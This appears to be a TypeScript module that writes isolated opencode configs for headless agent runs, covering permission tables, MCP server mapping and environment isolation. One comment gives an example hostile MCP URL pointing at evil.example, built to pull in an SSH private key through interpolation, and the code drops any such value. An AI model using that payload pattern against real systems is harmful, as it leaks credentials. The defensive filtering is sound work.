import { mkdirSync } from "node:fs";
import { join } from "node:path";
import type { McpServerSpec, PermissionMode } from "@agentrunner/protocol";
import { writeNoFollow } from "./no-follow-write";
import { opencodeConfigHomeDir } from "./paths";

/** The isolated `opencode.json`'s mode: readable by every identity that may load it, writable by none. */
const CONFIG_MODE = 0o644;

/** The subdirectory opencode appends to `XDG_CONFIG_HOME` when it resolves its config directory. */
const CONFIG_SUBDIR = "opencode";

/** The config file name opencode reads from its config directory (`opencode.jsonc` also works). */
const CONFIG_FILE = "opencode.json";

/** opencode validates its config against this schema and refuses to start when a field is wrong. */
const CONFIG_SCHEMA = "https://opencode.ai/config.json";

/**
 * Every permission key opencode 1.18 recognizes. The isolated config writes ALL of them on every
 * seed, because an OMITTED key falls back to opencode's own default - and that default is `ask` for
 * at least `external_directory`, which a headless run auto-REJECTS with a non-JSON line on stdout.
 * Naming each key makes the posture deterministic instead of "whatever this opencode build defaults
 * to", which is the same reason the Grok isolated home writes every `[compat.*]` cell explicitly.
 */
const PERMISSION_KEYS = [
	"read",
	"glob",
	"grep",
	"list",
	"lsp",
	"todowrite",
	"webfetch",
	"websearch",
	"edit",
	"skill",
	"task",
	"bash",
	"external_directory",
	"doom_loop",
	"question"
] as const;

/** The non-destructive floor: the keys a `read-only` run keeps. */
const READ_KEYS: readonly string[] = [
	"read",
	"glob",
	"grep",
	"list",
	"lsp",
	"todowrite",
	"webfetch",
	"websearch"
];

/** What `auto-edit` adds on top of {@link READ_KEYS} - edits and the tools that compose them. */
const EDIT_KEYS: readonly string[] = ["edit", "skill", "task"];

/** One opencode MCP server entry, in the shape its config schema discriminates on `type`. */
type OpencodeMcpEntry =
	| { type: "local"; command: string[]; enabled: true; environment?: Record<string, string> }
	| { type: "remote"; url: string; enabled: true };

/** The isolated config document written to disk AND handed over as `OPENCODE_CONFIG_CONTENT`. */
export interface OpencodeIsolatedConfig {
	/** Pinned so a buyer's editor validates the file, and so opencode's own strict check passes. */
	$schema: string;
	/** `disabled` - a driven run must never publish its transcript to opencode's share service. */
	share: "disabled";
	/** `false` - a headless turn must not stop to self-update mid-run. */
	autoupdate: false;
	/** The run's permission posture, one action per {@link PERMISSION_KEYS} entry. */
	permission: Record<string, "allow" | "deny">;
	/** The app/integration MCP servers for this run - and nothing else. */
	mcp: Record<string, OpencodeMcpEntry>;
}

/** Inputs {@link opencodeIsolatedConfig} needs to render one run's config. */
export interface OpencodeIsolatedConfigInput {
	/** The app/integration MCP servers for this run, keyed by server name. */
	mcpServers?: Record<string, McpServerSpec>;
	/** The run's abstract permission posture. */
	permissionMode: PermissionMode;
	/** Whether the run is capability-floored (a paired backend dispatched it). */
	floored?: boolean;
}

/**
 * Matches opencode's own config-value INTERPOLATION syntax: a string value containing `{env:VAR}`
 * or `{file:path}` is substituted by opencode before use.
 *
 * A spec carrying one is DROPPED rather than emitted, because interpolation turns a config value
 * into a file/environment READ: an MCP url of `https://evil.example/?x={file:~/.ssh/id_rsa}` would
 * have opencode paste the key material into a request the app never authored. Our specs come from
 * the app's own MCP wiring and never contain the syntax, so this costs nothing real - it is the
 * same defence-in-depth as charset-gating a permission rule name before it reaches argv.
 */
const INTERPOLATION_PATTERN = /\{(?:env|file):/;

/** True when any supplied string carries opencode's `{env:…}` / `{file:…}` interpolation syntax. */
function hasInterpolation(...values: readonly (string | undefined)[]): boolean {
	return values.some((value) => value !== undefined && INTERPOLATION_PATTERN.test(value));
}

/**
 * Maps the run's MCP servers onto opencode's `mcp` config table.
 *
 * opencode discriminates on `type`: a `local` server carries a `command` ARRAY (binary first) plus
 * an optional `environment` table, and a `remote` server carries a `url`. The wire spec's `sse` and
 * `http` transports both land on `remote` - opencode has no third transport, and it negotiates the
 * two itself.
 *
 * A spec missing its transport's required field is SKIPPED rather than emitted half-formed: opencode
 * validates its config strictly and REFUSES TO START on a bad field, so a malformed entry would fail
 * the whole run rather than degrade one tool.
 *
 * @param specs - The app/integration MCP servers for this run, keyed by server name.
 * @returns The `mcp` table to write, containing only the servers opencode can actually start.
 */
export function opencodeMcpConfig(
	specs: Record<string, McpServerSpec> = {}
): Record<string, OpencodeMcpEntry> {
	const out: Record<string, OpencodeMcpEntry> = {};
	for (const [name, spec] of Object.entries(specs)) {
		if (spec.type === "stdio") {
			if (!spec.command) continue;
			const args = spec.args ?? [];
			const env = spec.env ?? {};
			if (hasInterpolation(spec.command, ...args, ...Object.values(env))) continue;
			out[name] = {
				type: "local",
				command: [spec.command, ...args],
				enabled: true,
				...(Object.keys(env).length > 0 ? { environment: { ...env } } : {})
			};
			continue;
		}
		if (!spec.url || hasInterpolation(spec.url)) continue;
		out[name] = { type: "remote", url: spec.url, enabled: true };
	}
	return out;
}

/**
 * Derives opencode's `permission` table from the run's abstract {@link PermissionMode}.
 *
 * PERMISSIONS ARE CLI-SELF-APPLIED, NOT OS-ENFORCED - `opencode run` exposes no sandbox, no egress
 * switch and no read-deny, so this is the whole confinement surface and it is only as strong as the
 * CLI's own gate. What makes it usable headlessly is that opencode FAILS CLOSED: with no approver
 * attached, `opencode run` auto-REJECTS every permission it would otherwise ask about (verified -
 * a denied `external_directory` read came back as "The user rejected permission to use this specific
 * tool call"). So this table only ever says `allow` or `deny`; `ask` is deliberately never written,
 * because an `ask` a headless run cannot answer is a rejection with a stray non-JSON line on stdout.
 *
 * A FLOORED run denies every key. It keeps exactly the app's own MCP tools, which opencode's
 * permission keys do not name - the same shape the Claude floor takes, for the same reason.
 *
 * @param mode - The abstract permission posture.
 * @param floored - Whether the run is capability-floored (a paired backend dispatched it).
 * @returns One `allow`/`deny` action for every key in {@link PERMISSION_KEYS}.
 */
export function opencodePermissionConfig(
	mode: PermissionMode,
	floored = false
): Record<string, "allow" | "deny"> {
	const allowed = new Set<string>(
		floored
			? []
			: mode === "full"
				? PERMISSION_KEYS
				: mode === "auto-edit"
					? [...READ_KEYS, ...EDIT_KEYS]
					: READ_KEYS
	);
	const out: Record<string, "allow" | "deny"> = {};
	for (const key of PERMISSION_KEYS) out[key] = allowed.has(key) ? "allow" : "deny";
	return out;
}

/**
 * Renders the whole isolated config document for one run: the app's MCP servers, the run's
 * permission posture, and the two safety pins (`share: "disabled"` so a driven transcript is never
 * published, `autoupdate: false` so a turn never stops to upgrade the binary).
 *
 * @param input - The run's MCP servers, permission posture and floor.
 * @returns The config document, ready to serialize.
 */
export function opencodeIsolatedConfig(input: OpencodeIsolatedConfigInput): OpencodeIsolatedConfig {
	return {
		$schema: CONFIG_SCHEMA,
		share: "disabled",
		autoupdate: false,
		permission: opencodePermissionConfig(input.permissionMode, input.floored),
		mcp: opencodeMcpConfig(input.mcpServers)
	};
}

/**
 * Serializes {@link opencodeIsolatedConfig}. The SAME text is both written to the isolated config
 * home and handed over as `OPENCODE_CONFIG_CONTENT`, so the two isolation layers can never disagree.
 *
 * @param input - The run's MCP servers, permission posture and floor.
 * @returns The `opencode.json` contents for this run.
 */
export function opencodeIsolatedConfigJson(input: OpencodeIsolatedConfigInput): string {
	return `${JSON.stringify(opencodeIsolatedConfig(input), null, 2)}\n`;
}

/**
 * Renders the config an INTERACTIVE terminal session hands over as `OPENCODE_CONFIG_CONTENT` - the
 * one lever that ADDS the session's MCP servers without touching anything else the user configured.
 * `OPENCODE_CONFIG_CONTENT` MERGES on top of the user's own config as the LAST layer (measured, see
 * {@link opencodeIsolationEnv}), so their model default, instructions, plugins and personal servers
 * all keep working; this document deliberately carries the `mcp` table and NOTHING else - no
 * permission posture (the TUI's own prompts are the approver), no share/autoupdate pins (the
 * session is the user's own), no `XDG_CONFIG_HOME` repoint (their global config must keep loading).
 *
 * The environment is also WHY this exists at all: opencode's TUI documents no MCP flag, and its
 * yargs parser silently ignores an invented one - a token-bearing loopback url on argv would sit in
 * a world-readable `/proc/<pid>/cmdline` while wiring nothing (see `opencodeTerminalArgs`).
 *
 * The INSTRUCTIONS ride the same document, as a file path in its `instructions` array - measured:
 * opencode reads the file and the model follows it. This is the session's only instructions channel
 * (the TUI has no system-prompt flag, and there is no headless prompt to prepend to), so without it
 * an opencode terminal answered as a bare coding agent with no idea which product it serves.
 *
 * @param mcpServers - The session's MCP servers, keyed by server name.
 * @param instructionsPath - Absolute path to the composed instructions file, when the host wrote one.
 * @returns The `OPENCODE_CONFIG_CONTENT` value for the spawn.
 */
export function opencodeTerminalConfigJson(
	mcpServers: Record<string, McpServerSpec>,
	instructionsPath?: string
): string {
	return `${JSON.stringify(
		{
			$schema: CONFIG_SCHEMA,
			...(instructionsPath !== undefined ? { instructions: [instructionsPath] } : {}),
			mcp: opencodeMcpConfig(mcpServers)
		},
		null,
		2
	)}\n`;
}

/**
 * The environment variables that isolate one headless opencode run, composed with the config text
 * the run was rendered from. CREDENTIALS AND CONFIG NEVER RIDE ARGV - this is all environment, and
 * `opencode run` takes no config flag anyway.
 *
 * Each variable was MEASURED against opencode 1.18.17 with a planted user config, not read off a
 * help text:
 * - `OPENCODE_CONFIG_CONTENT` is the LAST config merge, so it is the only layer a checked-in
 *   workspace `opencode.json` cannot override. The permission posture rides here for exactly that
 *   reason: written only to the isolated config home, a project file overrode it (verified).
 * - `XDG_CONFIG_HOME` repoints the GLOBAL config scope, which is the only lever that drops the
 *   user's own `~/.config/opencode` - their personal `mcp` servers, model default, instructions and
 *   global plugins. `OPENCODE_CONFIG`, `OPENCODE_CONFIG_DIR` and `OPENCODE_CONFIG_CONTENT` all MERGE
 *   on top of the user's config rather than replacing it (all three verified).
 * - `OPENCODE_DISABLE_CLAUDE_CODE` / `OPENCODE_DISABLE_EXTERNAL_SKILLS` stop opencode loading the
 *   user's `~/.claude` and `~/.agents` skills, which survive both `--pure` and the config repoint.
 * - `OPENCODE_DISABLE_AUTOUPDATE` and `OPENCODE_DISABLE_SHARE` mirror the two config pins, so a
 *   build that reads only the env var still gets them.
 *
 * COLLATERAL, stated plainly: `XDG_CONFIG_HOME` is a GENERIC variable, so a tool the agent shells
 * out to that reads its own config from `$XDG_CONFIG_HOME/<tool>` (notably `gh`) sees the isolated
 * base instead of the user's and behaves as if unconfigured. The child env is already scrubbed to an
 * operational allowlist - `GH_TOKEN`/`GITHUB_TOKEN` and every other credential are dropped before
 * this - so that tool was already degraded; this widens it from "no token" to "no config". opencode
 * exposes no CLI-specific way to drop its global config, so the choice is this or loading the user's
 * personal MCP servers into every driven run.
 *
 * @param configHome - The isolated config base, or `undefined` to leave the user's own (the
 *   interactive terminal path, which keeps the full personal config).
 * @param configJson - The rendered config text from {@link opencodeIsolatedConfigJson}.
 * @returns The environment additions for the spawn (merged into the allowlisted child env).
 */
export function opencodeIsolationEnv(
	configHome: string | undefined,
	configJson: string
): Record<string, string> {
	return {
		OPENCODE_CONFIG_CONTENT: configJson,
		OPENCODE_DISABLE_CLAUDE_CODE: "1",
		OPENCODE_DISABLE_EXTERNAL_SKILLS: "1",
		OPENCODE_DISABLE_AUTOUPDATE: "1",
		OPENCODE_DISABLE_SHARE: "1",
		...(configHome ? { XDG_CONFIG_HOME: configHome } : {})
	};
}

/**
 * Re-authors the isolated config home's `opencode.json`, for a caller about to spawn opencode
 * against it.
 *
 * This is the GLOBAL-scope half of the isolation. It is written wholesale on every call so the
 * global scope carries exactly this run's servers and nothing else - not a prior run's, and not a
 * stale document from an older build. Called immediately before the spawn for the same reason the
 * Codex and Grok homes re-seed there: it leaves only the child's own startup between the write and
 * opencode's read.
 *
 * It is deliberately NOT the enforcement layer. A workspace `opencode.json` merges AFTER the global
 * scope and can override it, so the run's permission posture is enforced by the
 * `OPENCODE_CONFIG_CONTENT` copy of the same document, which merges LAST (see
 * {@link opencodeIsolationEnv}).
 *
 * @param configHome - The isolated config base (from {@link ensureIsolatedOpencodeConfigHome}).
 * @param input - The run's MCP servers, permission posture and floor.
 * @throws When the config cannot be authored at all - a run must not proceed with no isolation file.
 */
export function reseedIsolatedOpencodeConfig(
	configHome: string,
	input: OpencodeIsolatedConfigInput
): void {
	const dir = join(configHome, CONFIG_SUBDIR);
	mkdirSync(dir, { recursive: true });
	writeNoFollow(join(dir, CONFIG_FILE), opencodeIsolatedConfigJson(input), CONFIG_MODE);
}

/**
 * Ensures the runner-managed ISOLATED opencode config base exists and returns its path, for a
 * headless chat/automation opencode run. It is the counterpart of `ensureIsolatedCodexHome` /
 * `ensureIsolatedGrokHome`, and it is deliberately SMALLER than either: only the config base moves,
 * so opencode still reads its `auth.json` and its session store from the user's own data directory.
 * That means subscription auth is preserved with NO credential symlinked or copied anywhere, and a
 * follow-up turn can resume a session the previous turn created.
 *
 * WHAT IS ISOLATED, EXACTLY - each item measured against opencode 1.18.17 with a planted user
 * config, `opencode debug config` / `debug skill` / `debug info` as the probe:
 * - The user's GLOBAL config (`~/.config/opencode/opencode.json`): their `mcp` servers, model
 *   default, `instructions`, global `AGENTS.md`, agents and commands. Dropped by the
 *   `XDG_CONFIG_HOME` repoint. Nothing else drops it: `OPENCODE_CONFIG`, `OPENCODE_CONFIG_DIR` and
 *   `OPENCODE_CONFIG_CONTENT` each MERGE on top of it (all three verified to leave the user's
 *   servers loaded).
 * - External PLUGINS, including the user's global `~/.config/opencode/plugin/*.js`. Dropped by
 *   `--pure` on argv, which opencode reports as "external plugins disabled".
 * - The user's `~/.claude` and `~/.agents` SKILLS, which survive both of the above. Dropped by
 *   `OPENCODE_DISABLE_CLAUDE_CODE` / `OPENCODE_DISABLE_EXTERNAL_SKILLS` - with them the skill list
 *   is opencode's one built-in and nothing else.
 * - opencode does NOT read `~/.claude.json` MCP servers at all (verified: zero leak), so there is no
 *   Grok-style foreign-harness MCP surface to close here.
 *
 * WHAT IS NOT ISOLATED, stated rather than claimed away: the CONNECTED WORKSPACE's own
 * `opencode.json` / `.opencode/` still loads, so a checked-in file can ADD an MCP server or an agent
 * to a run. `OPENCODE_DISABLE_PROJECT_CONFIG` would close it, and is deliberately NOT set: it also
 * drops the workspace's `AGENTS.md` (verified - the instructions stopped reaching the model), which
 * is the context a coding agent is supposed to have. The residual is bounded on the half that
 * matters: a project file merges BEFORE `OPENCODE_CONFIG_CONTENT`, so it can add a server but it
 * cannot weaken the run's permission posture (verified).
 *
 * Unlike the Codex and Grok homes this directory is never handed to the agent identity: opencode
 * writes its state to the data directory, not here, so the file stays root/owner-owned and
 * world-readable. There is therefore no "a prior run replaced the config" race to narrow - and
 * `writeNoFollow` still guards the write itself, because a config path is exactly the kind of file a
 * confused deputy would be asked to truncate through a symlink.
 *
 * Idempotent and cheap: it creates the directory and seeds a server-free config, so a home created
 * ahead of a run can never be read with a stale server table in it.
 *
 * @param appDataRoot - The daemon's app-data root.
 * @returns The absolute isolated config base to hand over as `XDG_CONFIG_HOME`.
 */
export function ensureIsolatedOpencodeConfigHome(appDataRoot: string): string {
	const configHome = opencodeConfigHomeDir(appDataRoot);
	// Seeded with NO servers and the most restrictive posture: the run's own servers and posture are
	// written by `reseedIsolatedOpencodeConfig` at spawn time, when they are known. What matters here
	// is that the file EXISTS and is server-free, so a home created ahead of a run is never read with
	// a stale server table in it.
	reseedIsolatedOpencodeConfig(configHome, { permissionMode: "read-only", floored: true });
	return configHome;
}
